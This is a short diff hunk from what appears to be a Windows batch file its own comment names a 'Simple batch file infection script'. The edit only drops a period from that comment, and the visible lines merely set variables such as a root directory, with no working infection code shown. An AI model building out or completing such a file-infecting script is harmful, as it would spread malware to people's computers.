@@ -1,4 +1,4 @@
-::Simple batch file infection script.
+::Simple batch file infection script
 ::VAR
 SET DELONEXIT=0
 SET DIR=C:\
